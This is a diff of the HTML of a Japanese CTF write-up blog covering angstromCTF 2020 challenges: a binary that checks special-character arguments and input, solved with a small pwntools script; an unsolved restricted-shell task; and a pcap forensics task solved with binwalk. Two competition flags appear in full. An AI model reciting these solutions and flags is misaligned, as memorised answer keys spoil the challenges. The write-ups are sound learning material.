+    <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">&#34; </span><span class="se">\n</span><span class="s">&#39;</span><span class="se">\&#34;\x07</span><span class="s">&#34;</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Your argument isn&#39;t right.&#34;</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+    <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\x00\x01\x02\x03\n</span><span class="s">&#34;</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Your input isn&#39;t right.&#34;</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;You seem to know what you&#39;re doing.&#34;</span><span class="p">);</span>
+    <span class="n">print_flag</span><span class="p">();</span>
 <span class="p">}</span>
-<span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">&#34; </span><span class="se">\n</span><span class="s">&#39;</span><span class="se">\&#34;\x07</span><span class="s">&#34;</span><span class="p">))</span> <span class="p">{</span>
-    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Your argument isn&#39;t right.&#34;</span><span class="p">);</span>
-    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
-<span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
-<span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\x00\x01\x02\x03\n</span><span class="s">&#34;</span><span class="p">))</span> <span class="p">{</span>
-    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Your input isn&#39;t right.&#34;</span><span class="p">);</span>
-    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="n">puts</span><span class="p">(</span><span class="s">&#34;You seem to know what you&#39;re doing.&#34;</span><span class="p">);</span>
-<span class="n">print_flag</span><span class="p">();</span>
-<span class="p">}</span></code></pre></td></tr></table>
+</code></pre></td></tr></table>
 </div>
-</div></li>
-</ul>
-
-<p><br /></p>
-
+</div><p><br /></p>
 <h3 id="unsolved-1">(Unsolved)</h3>
-
 <p>ちょっとヒントの意味もわからなかったです。意外と難しいもんですね。後日、復習しておきます。</p>
-
 <p><br /><br />
 2020/03/20 - 復習しました。</p>
-
 <p>なんか、pwntoolsで普通にできたみたいです。イベント中にやったときは、なぜかできなかった気がしたんですけど。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1079,94 +976,68 @@ Hint: There are ways to run programs without using the shell.</p>
 
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x00\x01\x02\x03\n</span><span class="s2">&#34;</span><span class="p">)</span>
 <span class="n">msg</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
-<span class="k">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span></code></pre></td></tr></table>
+<span class="k">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><br>
+</div><br>
 <pre>
-captureamerica@kali:~/CTF/angstromCTF_2020$ ./inputter_solve.py
+captureamerica@kali:~/CTF/angstromCTF_2020$ ./inputter_solve.py 
 [+] Connecting to shell.actf.co on port 22: Done
-[<em>] xxxxx@shell.actf.co:
+[*] xxxxx@shell.actf.co:
     Distro    Ubuntu 16.04
     OS:       linux
     Arch:     amd64
     Version:  4.4.0
     ASLR:     Enabled
-[</em>] Working directory: '/problems/2020/inputter'
+[*] Working directory: '/problems/2020/inputter'
 [+] Starting remote process './inputter' on shell.actf.co: pid 21500
 [+] Receiving all data: Done (94B)
 [*] Stopped remote process 'inputter' on shell.actf.co (pid 21500)
 You seem to know what you're doing.
 actf{impr4ctic4l_pr0blems_c4ll_f0r_impr4ctic4l_s0lutions}
-</pre></p>
-
-<p><br>
-Flag: <code>actf{impr4ctic4l_pr0blems_c4ll_f0r_impr4ctic4l_s0lutions}</code></p>
-
+</pre>
+<br>
+Flag: `actf{impr4ctic4l_pr0blems_c4ll_f0r_impr4ctic4l_s0lutions}`
 <p><br /><br />
 <br /><br /></p>
-
-<h2 id="misc-all-these-rules-points">[Misc]: All These Rules (?? points)</h2>
-
-<hr />
-
+<h2 id="misc-all-these-rules--points">[Misc]: All These Rules (?? points)</h2>
+<hr>
 <h3 id="challenge-7">Challenge</h3>
-
 <blockquote>
-<p>Clam can't do this, he can't do that, wouldn't it be nice if there were something that he could do?
+<p>Clam can&rsquo;t do this, he can&rsquo;t do that, wouldn&rsquo;t it be nice if there were something that he could do?
 <br><br>
-ssh chall@misc.2020.chall.actf.co
+ssh <a href="mailto:chall@misc.2020.chall.actf.co">chall@misc.2020.chall.actf.co</a>
 <br><br></p>
 </blockquote>
-
 <p><br /></p>
-
 <h3 id="unsolved-2">(Unsolved)</h3>
-
 <p>restricted shellの問題です。</p>
-
 <p>どうやら、チャレンジが削除されてしまったようなので、何か不具合があったのかもです。</p>
-
 <p>これは解きたかったなぁ。（というか、解けないやつだったかもだけど。）</p>
-
 <p><br /><br />
 <br /><br />
 <img src="https://captureamerica.github.io/writeups/img/orange_bar.png" alt="orange_bar.png">
 <br />
 ここから下はCTF終了後（2020/03/20）に行った復習です。他の方のWriteupとか参照してます。</p>
-
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="misc-ws3-180-points">[Misc]: WS3 (180 points)</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-8">Challenge</h3>
-
 <blockquote>
-<p>What the... record.pcapng</p>
+<p>What the&hellip; record.pcapng</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>record.pcapng</li>
 </ul>
-
 <p><br /></p>
-
 <h3 id="solution-5">Solution</h3>
-
 <p>git-receive-pack というのが出てきて、よく知らなかったのでスルーしたやつなんですが、gitを使わずとも解ける問題だったみたいなので再度やってみました。</p>
-
 <p>HTTP のオブジェクトをExportします。いくつかありますが、サイズが他と比べて特別大きい18KBのやつを狙います。</p>
-
-<p><img src="https://captureamerica.github.io/writeups/img/angstromctf_ws3.png" alt="angstromctf_ws3.png"></p>
-
-<p><br>
-binwalkします。</p>
-
+<img src="https://captureamerica.github.io/writeups/img/angstromctf_ws3.png" alt="angstromctf_ws3.png">
+<br>
+binwalkします。
 <pre>
 captureamerica@kali:~/Downloads$ binwalk --dd='.*' git-receive-pack 
 
@@ -1176,10 +1047,8 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 342           0x156           Zlib compressed data, default compression
 425           0x1A9           Zlib compressed data, default compression
 </pre>
-
-<p><br>
-ここで、zlib-flateを使って解凍してもいいんですが、extractedの中にすでに解凍されたものも生成されてます。</p>
-
+<br>
+ここで、zlib-flateを使って解凍してもいいんですが、extractedの中にすでに解凍されたものも生成されてます。
 <pre>
 captureamerica@kali:~/Downloads/_git-receive-pack.extracted$ file *
 156:                 data
@@ -1190,20 +1059,14 @@ angstromctf_1A9.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 
 B7:                  Git tree 87872
 B7.zlib:             zlib compressed data
 </pre>
-
-<p><br>
-1A9はJpegファイルで、開くとフラグが見つかります。</p>
-
-<p><img src="https://captureamerica.github.io/writeups/img/angstromctf_1A9.jpg" alt="angstromctf_1A9.jpg"></p>
-
-<p><br>
-Flag: <code>actf{git_good_git_wireshark-123323}</code></p>
-
+<br>
+1A9はJpegファイルで、開くとフラグが見つかります。
+<img src="https://captureamerica.github.io/writeups/img/angstromctf_1A9.jpg" alt="angstromctf_1A9.jpg">
+<br>
+Flag: `actf{git_good_git_wireshark-123323}`
 <p><br /><br />
 <br /><br /></p>
-
-<hr />
-
+<hr>
 <p><br /><br />
 <br /><br /></p>
 
